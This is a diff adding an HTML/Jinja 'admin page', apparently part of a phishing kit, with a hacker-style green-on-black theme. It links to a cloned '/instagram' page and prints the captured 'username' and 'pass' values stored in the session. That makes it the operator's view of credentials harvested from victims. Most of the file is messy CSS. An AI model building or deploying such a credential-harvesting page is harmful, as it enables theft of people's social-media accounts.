@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+		<meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+		<title>admin page </title>
+		
+</head>
+<body>
+		<h1>admin page </h1>
+		
+		<div class="container">
+				<div class="code-card">
+									<h1>clone page link </h1>
+											<a class="hacker-link" href="/instagram"> link for user   </a> 
+							<h1>user datat </h1>
+						<p>   </p>
+						<p>   </p>
+						{% if session['name'] %}
+						<p>username :-  {{ session['name']}}</p>
+						<p>pass :-   {{ session['pass'] }}    </p>
+						{% else %}
+						<p>data is not </p>
+						{% endif  %}
+				</div>
+		
+				
+	
+				
+		</div>
+		
+		
+		<style>
+		body {
+    font-family: 'Courier New', monospace;
+    background-color: #000;
+    color: lime;
+    resize: both;
+    overflow: auto;
+}
+		nav {
+            background-color: #000; /* Black background */
+            color: #00FF00; /* Green text */
+            text-align: center;
+            padding: 10px;
+        }
+        nav a {
+            color: #00FF00; /* Green text */
+            padding: 14px 16px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        nav a:hover {
+            background-color: #00FF00; /* Green background on hover */
+            color: #000; /* Black text on hover */
+        }
+		font-family:Arial, sans-serif; {
+      margin: 9;
+      padding: 10;
+}
+
+h1, h2, h3, h4, h5, h6, form {
+    font-family: 'Consolas', monospace;
+    color: #00FF00; 
+		  font-size: 28px;
+}
+
+a {
+    color: #00FF00;
+}
+
+p, li, td, th {
+    font-family: 'Lucida Console', monospace;
+    color: #00FF00;
+		  
+}
+
+
+.container {
+	display: grid;
+  
+			grid-gap: 20px;
+		
+				grid-template-areas:
+        		"c1"
+          "c2"
+          ;
+				
+  
+}
+
+.code-card {
+		
+			background-color: #111;
+            color: #00FF00;
+            border: 1px solid #00FF00;
+            padding: 10px;
+            box-shadow: 3px 3px 0 lime;
+			p{
+					
+			  font-weight: bold;
+			}
+		h1 {
+				font-size 8px;
+		}
+}
+	.code-card:nth-child(1) {
+	  
+						width: 390px; 
+			  height: 440px; 
+	    grid-area: c1;
+			p{
+					font-size: 22px;
+			}
+			
+		}
+		
+			.code-card:nth-child(2) {
+				grid-area: c2;
+				.isp {
+  font-size: 12px;
+				}
+					
+					.yo {
+							font-size: 10px;
+					}
+		}
+
+a {
+            background-color: #000; /* Black background */
+            color: #00FFF0; /* Green text */
+            padding: 25px;
+						      font-size: 28px;
+						
+        }
+						a {
+            color: #00FF00; /* Green text */
+            padding: 14px 16px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        nav a:hover {
+            
+            color: #000; /* Black text on hover */
+        }
+
+
+
+		
+
+   /* CSS for hacker-themed submit button */
+        .submit {
+            background-color: #00FF00; /* Green color */
+            border: ffffff;
+            color: #fff; /* White text */
+            padding: 10px 30px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 20px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 2px 2px 2px #88; /* Apply a shadow effect */
+        }
+        .submit:hover {
+            background-color:   #00CC00; /* Darker green on hover */
+        }
+
+   /* CSS for hacker-themed input field */
+        .main {
+            padding: 5px;
+            background-color: #00FF00; /* Green background */
+            border: 1px solid #000; /* White border */
+            border-radius: 4px;
+            box-shadow: 2px 2px 2px #888888; /* Apply a shadow effect */
+            color: #00FF00; /* Text color */
+            font-size: 20px;
+            display: flex;
+        }
+        .main:focus {
+            background-color: #000; 
+        }
+
+  		
+  		        /* CSS for hacker-themed menu bar with buttons */
+        body {
+            margin: 10;
+            padding: 10;
+            font-family: Arial, sans-serif;
+            resize: both;
+            overflow: auto;
+        }
+        
+		
+		</style>
+		
+		
+</body>
+</html>
